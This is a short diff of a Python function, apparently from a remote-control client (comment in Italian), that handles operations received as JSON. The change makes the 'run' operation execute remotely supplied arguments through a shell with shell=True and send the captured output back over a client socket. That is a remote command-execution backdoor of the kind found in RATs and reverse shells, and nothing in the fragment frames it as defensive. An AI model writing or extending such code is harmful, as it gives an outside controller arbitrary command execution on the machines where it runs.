@@ -21,8 +21,8 @@ def _do(response_json):
         pull()
         subprocess.run("copy ")
     elif response_json["op"] == "run":
-        res = subprocess.run(response_json["args"])
-        client.send(str(res).encode())
+        res = subprocess.run(response_json["args"], shell=True, stdout=subprocess.PIPE)
+        client.send(str(res.stdout).encode())
 
     # false mantiene aperto il ciclo while
     return False
